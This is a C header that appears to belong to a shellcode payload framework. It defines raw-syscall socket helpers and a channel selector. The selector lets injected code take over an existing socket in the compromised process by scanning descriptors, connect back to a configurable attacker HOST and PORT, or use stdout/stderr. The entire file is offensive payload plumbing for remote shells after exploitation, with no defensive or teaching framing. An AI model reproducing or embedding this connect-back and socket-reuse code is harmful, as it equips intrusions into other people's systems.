#ifndef _SOCKET_HELPER_H
#define _SOCKET_HELPER_H

#include <factory.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#ifndef CHANNEL
#define CHANNEL REUSE_SOCKET
#endif

#ifndef HOST
#define HOST 0
#endif

#ifndef PORT
#define PORT 0
#endif

struct channel
{
    int rx;
    int tx;
};

enum channel_mode
{
    REUSE_SOCKET,
    CONNECT_BACK,
    USE_STDOUT,
    USE_STDERR,
};

static const unsigned long connect_back_addr = HOST;
static const unsigned short connect_back_port = PORT;

static inline
int _socket(int domain, int type, int protocol)
{
    return INTERNAL_SYSCALL(socket,, 3, domain, type, protocol);
}

static inline
int _connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
    return INTERNAL_SYSCALL(connect,, 3, sockfd, addr, addrlen);
}

static inline
int find_open_socket()
{
    for ( int fd = 0; fd != 0xFFFF; fd++ )
    {
        struct stat sb;

        INTERNAL_SYSCALL(fstat,, 2, fd, &sb);
        if ( S_ISSOCK(sb.st_mode) )
            return fd;
    }

    return -1;
}

static inline
int tcp_connect(const long addr, const short port)
{
    _Static_assert(connect_back_addr != 0, "Must specify an address to connect to.\n");
    _Static_assert(connect_back_port != 0, "Must specify a port to connect to.\n");

    struct sockaddr_in serv_addr;
    int sock = _socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = connect_back_port;
    serv_addr.sin_addr.s_addr = connect_back_addr;

    if ( _connect(sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0 )
        return -1;

    return sock;
}

static inline
struct channel get_communication_channel()
{
    int sock;
    struct channel chan;

    switch ( CHANNEL )
    {
        case REUSE_SOCKET:
            chan.rx = chan.tx = find_open_socket();
            break;

        case CONNECT_BACK:
            chan.rx = chan.tx = tcp_connect(HOST, PORT);
            break;
        
        case USE_STDOUT:
            chan.rx = 0;
            chan.tx = 1;
            break;

        case USE_STDERR:
            chan.rx = 0;
            chan.tx = 2;
            break;

        default:
            chan.rx = chan.tx = -1;
            break;
    }

    return chan;
}

#endif
